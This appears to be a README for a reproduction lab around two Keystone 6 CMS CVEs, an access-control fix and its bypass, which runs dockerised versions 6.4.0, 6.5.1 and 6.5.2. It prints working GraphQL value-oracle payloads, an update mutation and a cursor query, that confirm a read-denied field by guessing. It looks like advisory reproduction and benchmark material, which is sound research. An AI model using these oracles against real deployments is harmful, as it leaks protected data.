# keystone6-cve-2026-33326

长文分析见 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Incomplete-fix pair on **real `@keystone-6/core`** (Keystone 6 GraphQL/CMS framework).

| CVE | GHSA | what it fixed | version |
|-----|------|---------------|---------|
| CVE-2025-46720 (original) | GHSA-hg9m-67mm-7pg3 | `isFilterable` bypass in `update`/`delete` via multi-unique `where` | fixed in 6.5.0 |
| CVE-2026-33326 (bypass) | GHSA-cgcg-q9jh-5pr2 | residual: findMany `cursor` (same `WhereUniqueInput`) never access-checked | fixed in 6.5.2 |

Root cause: broken access control (CWE-863). A `Secret.code` field marked
`isFilterable: () => false` (a **function** — the advisory-affected config; static
`isFilterable:false` is not affected) and `access.read: denyAll` is never directly
readable, yet its value can be **confirmed** by abusing a filter/cursor input as a
boolean value-oracle.

## Versions (real npm bytes)
- V0 `6.4.0` (`:41390`) — original update-`where` oracle **reaches** the flag
- V1 `6.5.1` (`:41391`) — **TARGET**: original **blocked**, residual `cursor` oracle **reaches** the flag
- V2 `6.5.2` (`:41392`) — residual `cursor` oracle **blocked**

## The two value-oracles
```graphql
# original (CVE-2025-46720): only the first unique key is access-checked in update/delete
mutation { updateSecret(where:{ id:"<id>", code:"<guess>" }, data:{ label:"seed" }){ id } }

# residual (CVE-2026-33326): cursor bypasses isFilterable in findMany
query { secrets(cursor:{ code:"<guess>" }, take:1, orderBy:{ id:asc }){ id } }
```
Correct guess → record matched/returned. Wrong guess → access-denied/empty.
Guarded version → `KS_FILTER_DENIED`.

## Run
```bash
export PCB_FLAG="PCBFLAG-$(openssl rand -hex 6)"
docker compose --profile v0 up -d --build v0   # likewise v1, v2
python3 oracle.py http://127.0.0.1:41391 "$PCB_FLAG" both
docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all
```

Gate: `original@V0=REACHED, original@V1=BLOCKED, cursor@V1=REACHED, cursor@V2=BLOCKED`.
See `repro.log`. Benign: confirms only a planted `${PCB_FLAG}` token.
